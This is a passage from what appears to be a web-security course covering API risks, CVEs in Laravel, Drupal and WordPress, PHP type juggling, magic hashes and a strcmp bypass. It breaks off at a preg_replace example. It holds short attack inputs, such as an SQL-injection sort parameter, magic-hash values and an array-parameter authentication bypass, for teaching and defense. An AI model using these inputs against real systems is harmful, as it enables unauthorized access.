Exploiting the injection vulnerability, the attacker was able to gain unauthorized access to the system.</p><h2 id=improper-assets-management>Improper Assets Management</h2><p>Old API versions are often unpatched and can become an easy way to compromise systems without having to fight state-of-the-art security systems, which might be in place to protect the most recent API versions.
Attackers may gain access to sensitive data, or even take over the server through old, unpatched API versions connected to the same database.</p><p><strong>Example Attack Scenario:</strong></p><p>Say for instance that an organization redesigning their applications forgot about an old API version (api.someservice.com/v1) and left it unprotected, and with access to the user database.
While targeting one of the latest released applications, an attacker found the API address (api.someservice.com/v2).
Replacing v2 with v1 in the URL gave the attacker access to the old, unprotected API, exposing the personal identifiable information (PII) of millions of users.</p><h2 id=insufficient-logging--monitoring>Insufficient Logging & Monitoring</h2><p>Without logging and monitoring, or with insufficient logging and monitoring, it is almost impossible to track suspicious activities targeting APIs and respond to them in a timely fashion.
Without visibility over ongoing malicious activities, attackers have plenty of time to potentially compromise systems and steal data.
Most breach studies demonstrate the time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.</p><p><strong>Example Attack Scenario:</strong></p><p>Imagine that a video-sharing platform was hit by a &ldquo;large-scale&rdquo; credential stuffing attack.
Despite failed logins being logged, no alerts were triggered during the timespan of the attack, and it proceeded without being noticed.
As a reaction to user complaints about a possible breach, API logs were analyzed and the attack was detected, way after the fact.
The company had to make a public announcement asking users to reset their passwords, and report the incident to their regulatory authorities.</p><h1 id=framework-vulnerabilities>Framework Vulnerabilities</h1><p>Web application framework is a collection of pieces of software designed to ease the development of web applications.
Web application frameworks provide common solutions for a wide variety of tasks such as database access, input filtering for security purposes, authentication, session handling and templates for website development.</p><p>There are several different types of web application frameworks:</p><ul><li>General purpose website frameworks (Ruby On Rails, ExpressJS, Django, Flask)</li><li>Discussion forums, wikis and weblogs (WikiBase/WikiWikiWeb)</li><li>Organizational portals (JBoss Portal)</li><li>Content Management Systems (CMS) (Joomla, Drupal, Wordpress)</li></ul><p>When performing a security audition (or hacking) of a website it is necessary to identify the implementation technologies of the target.
This identification can be done manually or more commonly using automated tools, such as <a href=https://builtwith.com/>BuiltWith</a> and <a href=https://www.wappalyzer.com/>Wappalyzer</a>.
Once the web application framework is detected further penetration steps depend on the framework.
Quite a few websites are done with CMSs and contain no application-specific custom code.
For these applications, identifying the CMSs modules used and their version is necessary.
This information can be used further to search for vulnerabilities or perform a manual code inspection of the modules used.
Finding a security flaw usually means that the website has not been properly updated.
If a manual inspection of CMS modules reveals vulnerabilities, it is very likely that these modules are used in other websites, which makes them vulnerable as well.</p><p>The most widely used web Frameworks provide lots of security mechanisms by default - for example, Django provides protection for SQL injection, XSS injection, clickjacking and many more.
However, from time to time vulnerabilities are found and attackers have numerous possible targets, since some of these frameworks are extremely popular.</p><p>The rest of the section contains examples of vulnerabilities found in various framework versions.</p><h2 id=laravel>Laravel</h2><p>Laravel is one of the <a href=https://customerthink.com/what-makes-laravel-the-most-preferred-php-framework-for-web-development/>most preferred</a> PHP Frameworks for Web Development.</p><p>In 2019 a vulnerability was found for the popular Laravel-query-builder package.
Due to the way Laravel builder parses the string to query, the hacker can leverage this to attack the application with an SQL Injection attack.</p><p>The package is parsing the URLs to add some filters to the queries.</p><p>For example, if you want to sort the articles by title:</p><p><code>https://example.com/articles?sort=title</code></p><p>You may use the following code to automatically sort by the package:</p><pre tabindex=0><code>use Spatie\QueryBuilder\QueryBuilder;
$articles = QueryBuilder::for(Article::class)-&gt;get();
</code></pre><p>This will be translated into:</p><p><code>Article::orderBy('title')->get();</code></p><p>And the underlined SQL query will be:</p><p><code>SELECT * FROM 'articles' ORDER BY 'title' ASC</code></p><p>The attacker can take advantage of this transformation to perform an SQL Injection attack, by changing the URL to:</p><p><code>https://example.com/articles?sort=title->"%27))injectedSQL</code></p><p>Since Laravel supports queries in JSON fields, it will guess that you want to query json <code>title-></code> so it replaces <code>-></code> with JSON MySQL functions.
The attacker closes the function brackets <code>))</code> and adds his injected SQL.</p><p>The final command:</p><p><code>SELECT * FROM articles ORDER BY json_unquote(json_extract(title, '$.""'))</code><strong><code>injectedSQL</code></strong><code>"')) ASC</code></p><p><strong>Vulnerable versions:</strong></p><p>Laravel 5.6/5.7/5.8 with Laravel-query-builder &lt; v1.17.1
Laravel 5.5 with Laravel-query-builder &lt; v1.16.1</p><h2 id=drupal>Drupal</h2><p>Drupal is a free and open-source web content management framework written in PHP.
Drupal provides a back-end framework for at least 2.3% of all websites worldwide – ranging from personal blogs to corporate, political, and government sites.
According to builtwith.com, 473 of the Quantcast top 10,000 websites use Drupal, and that number jumps up to 4,341 when you look at the top 100,000.</p><p>Drupal introduced a Form API in Drupal 6 which allowed alteration of the form data during the form rendering process.
In 2018, Drupal released a patch adding just a single class, <em>RequestSanitizer</em>, with a <em>stripDangerousValues</em> method that resets all the items in an input array for keys that start with a hash sign.
This method sanitizes input data in <code>$_GET</code>, <code>$_POST</code> and <code>$_COOKIES</code> during the very early stages of Drupal’s bootstrap (immediately after loading the site configurations).
It can be assumed that the reason why the patch was released is to make an existing vulnerability harder to find.</p><p>The vulnerability was found in the forms.
The user registration form which requires no authentication and can be accessed anonymously contains multiple input fields and can be exploited.</p><p><img src=./assets/drupal1.png alt="Form Fields"></p><p>It was highly probable that injecting a renderable array would exploit the vulnerability, the question was where?</p><p>As it turns out, the “Email Address” field doesn’t sanitize the type of input it receives which allows hackers to inject the renderable array to the form array structure.
Renderable arrays contain metadata that is used in the rendering process.</p><p><img src=./assets/drupal2.png alt="Injected Array"></p><p>Since Drupal treats the injected array as a value and not as an element, attackers need to trick Drupal into rendering it.
Drupal renders an array on page load events or via Drupal AJAX API.</p><p>The &ldquo;Picture&rdquo; field of the user registration form uses Drupal’s AJAX API to upload a picture and replace it with a thumbnail of the uploaded image.</p><p>What&rsquo;s more important about this attack is that a Russian Security Researcher posted a <a href=https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py>POC</a> on Github and soon after numerous people started using it to install cryptocurrency miners and malware backdoors.</p><p><strong>Vulnerable versions:</strong></p><p>Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 ~ user/register URL, attacking account/mail & #post_render parameter, using PHP&rsquo;s passthru function
Drupal &lt; 7.58 ~ user/password URL, attacking triggering_element_name form & #post_render parameter, using PHP&rsquo;s passthru function</p><h2 id=wordpress>WordPress</h2><p>Details of a serious Denial of Service (DoS) vulnerability in WordPress have been published by an Israeli security researcher named Barak Tawily.
This vulnerability can be used to take down a website in a matter of minutes.</p><p>The vulnerability is listed on the CVE (Common Vulnerabilities and Exposures) website as CVE-2018-6389 and on Exploit DB as exploit number 43968.
Barak Tawily first wrote about it on February 5, 2018 on his blog.</p><p>This issue is related to a file called load-scripts.php, which is a part of the WordPress core.
This file is used to improve the performance by loading multiple external JavaScript (JS) files in a single request.</p><p>Barak first noticed the problem when he saw an unusual URL that was loading when he visited certain WordPress pages.
That URL was:</p><p><code>https://DOMAINNAME/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core&ver=4.9.1</code></p><p>He noticed that the load-scripts.php file was receiving a parameter called load[].
This parameter is an array that was receiving the names of the JS files that needed to be loaded.
In this case, it was receiving jQuery UI Core, which is the name of one of the Javascript files used by the WordPress login page.</p><p>Because WordPress is an open source platform, it was simple for Barak to review the application’s code and determine precisely how WordPress loaded these files.
He discovered that load-scripts.php file was designed to economize the loading of external JS files.
Another file, called load-styles.php, was doing the same thing for Cascading Style Sheet (CSS) files.</p><p>This feature allowed the browser to receive multiple files with a single request, dramatically improving the load time of each admin page.
Although it was only designed for use on admin pages, it was also being used on the login page — before the user had been authenticated.
This oversight is responsible for the vulnerability.</p><p>He continued to explore the source code of WordPress and discovered that there is a variable that contains a defined list of scripts that can be loaded.
If one of the names in the load[] array matches one of these script names, the server will perform an I/O read action to load it.
The list of scripts that are available is defined in a file called script-loader.php.
It includes 181 different scripts.
The server took ~2.2 seconds to gather the files, merge them into one file, and send them to the browser.
After performing 500 requests, the server was overloaded and became unable to respond to subsequent requests.
He posted a <a href="https://www.youtube.com/watch?v=nNDsGTalXS0&feature=youtu.be">video</a> showing how quickly it could be used to take down a WordPress website.</p><h3 id=wpscan>WPScan</h3><p>The <a href=https://wpscan.com/wordpress-security-scanner>WPScan</a> CLI tool is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to test the security of their sites.
The WPScan CLI tool uses a database of WordPress vulnerabilities - from WordPress versions, plugins, themes etc.</p><h1 id=further-reading>Further Reading</h1><ul><li>Metropolia University of Applied Sciences</li><li><a href=https://blog.papertrailapp.com/common-api-vulnerabilities-and-how-to-secure-them/>https://blog.papertrailapp.com/common-api-vulnerabilities-and-how-to-secure-them/</a></li><li><a href=https://techterms.com/definition/framework>https://techterms.com/definition/framework</a></li><li><a href=https://owasp.org/www-project-api-security/>https://owasp.org/www-project-api-security/</a></li><li><a href=https://www.checkmarx.com/blog/breaking-down-owasp-api-security-top10-part1>https://www.checkmarx.com/blog/breaking-down-owasp-api-security-top10-part1</a></li><li><a href=https://securityboulevard.com/2020/01/breaking-down-the-owasp-api-security-top-10-part-2/>https://securityboulevard.com/2020/01/breaking-down-the-owasp-api-security-top-10-part-2/</a></li><li><a href=https://shieldfy.io/blog/serious-sql-injection-vulnerability-in-laravel-query-builder/>https://shieldfy.io/blog/serious-sql-injection-vulnerability-in-laravel-query-builder/</a></li><li><a href=https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/>https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a></li><li><a href=https://www.secpod.com/blog/drupalgeddon-2/>https://www.secpod.com/blog/drupalgeddon-2/</a></li><li><a href=https://blog.threatpress.com/wordpress-vulnerability-dos/>https://blog.threatpress.com/wordpress-vulnerability-dos/</a></li><li><a href=https://freek.dev/1317-an-important-security-release-for-laravel-query-builder>https://freek.dev/1317-an-important-security-release-for-laravel-query-builder</a></li></ul><h1 id=activities>Activities</h1><ul><li><a href=https://sss-web.cyberedu.ro/challenge/ca1512a0-0616-11ed-be56-0fec9572decd>Clean up</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/f2efab30-0616-11ed-bb34-19a4ff512c6d>High Score</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/0cb44c00-0617-11ed-80ab-4758bca0c77e>Snoop Doggy Dogg</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/2026cea0-0617-11ed-8d3f-19288a331f73>The Accountant</a></li><li><a href=https://github.com/vavkamil/dvwp>Damn Vulnerable WordPress</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-6f17608ea1025e0a5b816d1e00d823ad>7 -</h1><h1 id=introduction>Introduction</h1><p>As a web developer, you need to pay attention to the quirks of your chosen programming language.
There are lots of vulnerabilities generated by the developer’s disregard to language-specific details or just by programming mistakes.</p><p>The most common server-side language on the web today is still <strong>PHP</strong>.
There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it.
Today, even if there are better options for the server-side choice, PHP is still pretty popular.</p><p><img src=./assets/language-stats.png alt="Server Side Languages Popularity"></p><p>Source <a href=https://w3techs.com/technologies/overview/programming_language>here</a>.</p><p>There are also lots of different PHP versions, each with its own vulnerabilities.
A small insight into the distribution of versions across the web is:</p><p><img src=./assets/version-stats.png alt="PHP Versions Popularity"></p><p>Source <a href=https://w3techs.com/technologies/details/pl-php>here</a>.</p><p>In this session we will focus on some exotic attacks against specific PHP functions and functionalities, as well as a quick overview of other interesting quirks.</p><h1 id=php-type-juggling>PHP Type Juggling</h1><p>Much like Python and Javascript, PHP is a dynamically typed language.
This means that variable types are checked while the program is executing.
For example, let’s take a variable called <code>$var</code>.
If we assign a string value to it, it becomes a string.
If an integer value is then assigned to <code>$var</code>, it becomes an integer.</p><p>Dynamic typing allows developers to be more flexible when using PHP.
But this kind of flexibility sometimes causes unexpected errors in the program flow and can even introduce critical vulnerabilities into the application.</p><p>In this section we will discuss <strong>PHP type juggling</strong> and how this can lead to authentication bypass vulnerabilities.</p><p><img src=./assets/type-juggling.png alt="Type Juggling examples"></p><h2 id=how-php-compares-values>How PHP compares values</h2><p>PHP has a feature called &ldquo;type juggling&rdquo; or &ldquo;type coercion&rdquo;.
This means that during the comparison of variables of different types, PHP will first convert them to a common, comparable type.</p><p>For example, when the program is comparing the string <code>"7"</code> and the integer <code>7</code> in the scenario below:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>7</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_str</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$example_str</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;PHP can compare ints and strings.&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>The code will run without errors and output <code>PHP can compare ints and strings.</code>.
This behavior is very helpful when you want your program to be flexible in dealing with different types of user input.</p><p>However, it is also important to note that this behavior is also a major source of bugs and security vulnerabilities.</p><p>For example, when PHP needs to compare the string <code>"7 puppies"</code> to the integer <code>7</code>, PHP will attempt to extract the integer from the string.
So this comparison will evaluate to <strong>True</strong>.</p><p><code>("7 puppies" == 7) -> True</code></p><p>But what if the string that is being compared does not contain an integer? The string will then be converted to a <code>"0"</code>.
So the following comparison will also evaluate to <strong>True</strong>:</p><p><code>("Puppies" == 0) -> True</code></p><p>You can try this yourself using an online PHP sandbox, such as <a href=http://www.writephponline.com/>this one</a>.</p><h2 id=loose-comparison-vs-strict-comparison--vs->Loose Comparison vs. Strict Comparison (<code>==</code> vs <code>===</code>)</h2><p>The <code>==</code> and <code>!=</code> are the default comparison operators in other languages.
But PHP has two main comparison modes, let’s call them <strong>loose</strong> (<code>==</code> and <code>!=</code>) and <strong>strict</strong> (<code>===</code> and <code>!==</code>).</p><p>The strict mode works by also comparing the type of the variable as well as the value.
So, for example, if we compare the number <code>7</code> and the string <code>"7"</code>, the result will be false because of the different types.
This time, PHP won’t use type juggling before comparing the values.</p><p>The following tables showcase the difference between the two comparison modes:</p><table><thead><tr><th>Loose comparison</th><th>Strict comparison</th></tr></thead><tbody><tr><td><img src=./assets/loose-comparison.png alt="Loose comparison"></td><td><img src=./assets/strict-comparison.png alt="Strict comparison"></td></tr></tbody></table><p>However, loose type comparison behavior like the one presented above is pretty common in PHP and many built-in functions work in the same way.
You can probably already see how this can be very problematic, but how exactly can hackers exploit this behavior?</p><h2 id=how-vulnerability-arises>How vulnerability arises</h2><p>The most common way that this particularity in PHP is exploited is by using it to bypass authentication.
Let’s say the PHP code that handles authentication looks like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$_POST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#34;password&#34;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#4e9a06>&#34;Admin_Password&#34;</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>login_as_admin</span><span style=color:#000;font-weight:700>();</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Then, simply submitting an integer input of <code>0</code> would successfully log you in as admin, since this will evaluate to <strong>True</strong>:</p><p><code>(0 == "Admin_Password") -> True</code></p><h3 id=conditions-of-exploitation>Conditions of exploitation</h3><p>However, this vulnerability is not always exploitable and often needs to be combined with a deserialization flaw.
The reason for this is that <strong>POST</strong>, <strong>GET</strong> parameters and <strong>cookie</strong> values are, for the most part, passed as strings or arrays into the program.</p><p>If the <strong>POST</strong> parameter from the example above was passed into the program as a string, PHP would be comparing two strings, and no type conversion would be needed.
And <code>"0"</code> and <code>"Admin_Password"</code> are, obviously, different strings.</p><p><code>("0" == "Admin_Password") -> False</code></p><p>However, type juggling issues can be exploited if the application accepts the input via functions like <code>json_decode()</code> or <code>unserialize()</code>.
This way, it would be possible for the end-user to specify the type of input passed in.</p><p><code>{"password": "0"}</code>
<code>{"password": 0}</code></p><p>Consider the above JSON blobs.
The first one would cause the password parameter to be treated as a string whereas the second one would cause the input to be interpreted as an integer by PHP.
This gives an attacker fine-grained control of the input data type and therefore the ability to exploit type juggling issues.</p><h2 id=avoiding-type-juggling-issues-in-php-code>Avoiding type juggling issues in PHP code</h2><p>As a developer, there are several steps that you can take to prevent these vulnerabilities from happening.</p><h3 id=use-strict-comparison-operators>Use strict comparison operators</h3><p>When comparing values, always try to use the type-safe comparison operator <code>===</code> instead of the loose comparison operator <code>==</code>.
This will ensure that PHP does not type juggle and the operation will only return <strong>True</strong> if the types of the two variables also match.
This means that <code>(7 === "7")</code> will return <strong>False</strong>.</p><h3 id=specify-the-strict-option-for-functions-that-compare>Specify the &ldquo;strict&rdquo; option for functions that compare</h3><p>Always consult the PHP manual on individual functions to check if they use loose comparison or type-safe comparison.
See if there is an option to use strict comparison and specify that option in your code.</p><p>For example, PHP’s <code>in_array()</code> uses loose comparison by default.
But you can make it switch to type-safe comparison by specifying the <code>strict</code> option.
If the function only provides loose comparison, avoid using that function and search for alternatives instead.</p><h3 id=avoid-typecasting-before-comparison>Avoid typecasting before comparison</h3><p>Avoid typecasting right before comparing values, as this will essentially deliver the same results as type juggling.
For example, before typecasting, the following three variables are all seen as distinct by the type-safe operator.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>7</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_str</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7_string&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_str_2</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>===</span> <span style=color:#000>$example_str</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#8f5902;font-style:italic>// This condition statement will return False
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;This will not print.&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>===</span> <span style=color:#000>$example_str_2</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>       <span style=color:#8f5902;font-style:italic>// This condition statement will return False
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;This will not print.&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Whereas after typecasting, PHP will only preserve the number extracted from a string, and <code>"7_string"</code> will become the integer <code>7</code>.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>7</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$example_str</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7_string&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>===</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>int</span><span style=color:#000;font-weight:700>)</span><span style=color:#000>$example_str</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#8f5902;font-style:italic>// This condition statement will return True
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;This will print.&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><h1 id=more-php-vulnerabilities>More PHP vulnerabilities</h1><h2 id=magic-hashes>Magic hashes</h2><p>Magic hashes are hashes that start with a leading <code>0e</code> (the scientific notation for &ldquo;0 to the power of some value&rdquo;) and have only numbers after that.</p><p>Let&rsquo;s say you stored a hashed password that looks like this: <code>0e462097431906509019562988736854</code>, which is the value returned by <code>md5(240610708)</code>.
Being a magic hash, if we use the loose comparison operator <code>==</code> against the user input and provide <code>0</code> as value, the following code will always return &ldquo;Matched&rdquo;.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$passwordHash</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>md5</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;240610708&#39;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// $_GET[&#39;password&#39;] = &#39;0&#39;
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$passwordHash</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;password&#39;</span><span style=color:#000;font-weight:700>])</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Matched&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>  <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Not matched&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Below is a table of such hashes discovered so far:</p><table><thead><tr><th>Hash Type</th><th>Hash Length</th><th>&ldquo;Magic&rdquo; Number / String</th><th>Magic Hashes</th><th>Found By</th></tr></thead><tbody><tr><td>md2</td><td>32</td><td>505144726</td><td>0e015339760548602306096794382326</td><td>WhiteHat Security, Inc.</td></tr><tr><td>md4</td><td>32</td><td>48291204</td><td>0e266546927425668450445617970135</td><td>WhiteHat Security, Inc.</td></tr><tr><td>md5</td><td>32</td><td>240610708</td><td>0e462097431906509019562988736854</td><td>Michal Spacek</td></tr><tr><td>md5</td><td>32</td><td>QNKCDZO</td><td>0e830400451993494058024219903391</td><td>-</td></tr><tr><td>sha1</td><td>40</td><td>10932435112</td><td>0e07766915004133176347055865026311692244</td><td>Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham</td></tr><tr><td>sha224</td><td>56</td><td>–</td><td>–</td><td>–</td></tr><tr><td>sha256</td><td>64</td><td>–</td><td>–</td><td>–</td></tr><tr><td>sha384</td><td>96</td><td>–</td><td>–</td><td>–</td></tr><tr><td>sha512</td><td>128</td><td>–</td><td>–</td><td>–</td></tr><tr><td>ripemd128</td><td>32</td><td>315655854</td><td>0e251331818775808475952406672980</td><td>WhiteHat Security, Inc.</td></tr><tr><td>ripemd160</td><td>40</td><td>20583002034</td><td>00e1839085851394356611454660337505469745</td><td>Michael A Cleverly</td></tr></tbody></table><p>Even though you won&rsquo;t find such examples on a daily basis, it&rsquo;s important to know that there is such a possibility and beware of using loose comparison.
It&rsquo;s just another example of how dangerous it is.</p><h2 id=bypassing-strcmp-function>Bypassing <code>strcmp()</code> function</h2><p>The <code>strcmp($str1, $str2)</code> function compares two strings.
The only possible return values are:</p><blockquote><p><strong>0</strong>, if <code>$str1</code> is equal to <code>$str2</code>
<strong>&lt; 0</strong>, if <code>$str1</code> is less than <code>$str2</code>
<strong>> 0</strong>, if <code>$str1</code> is greater than <code>$str2</code></p></blockquote><p>But what happens if we use the following code to check for a password?</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$password</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>$_POST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;password&#39;</span><span style=color:#000;font-weight:700>])</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>$success</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>true</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>$success</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>false</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>We could provide an array in the POST parameter instead of a string (<code>password[]=x</code>), resulting in PHP throwing a warning:</p><p><code>Warning: strcmp() expects parameter 2 to be string, array given in http://example.com/index.php on line 5</code></p><p>The interesting part here is that, even though PHP throws a warning, it goes on comparing the result of <code>strcmp()</code>, which is <code>NULL</code>, to <code>0</code> using the previously discussed loose comparison operator.
This means that <code>NULL</code> will be equal to <code>0</code> and so we could bypass the authentication.</p><h2 id=using-preg_replace-to-execute-commands>Using <code>preg_replace()</code> to execute commands</h2><p>The <code>preg_replace()</code> function is used to perform regular expressions search and replace.
A legitimate use of it could be:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$in</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;Somewhere, something incredible is waiting to be known&#39;</span><span style=color:#000;font-weight:700>;</span>
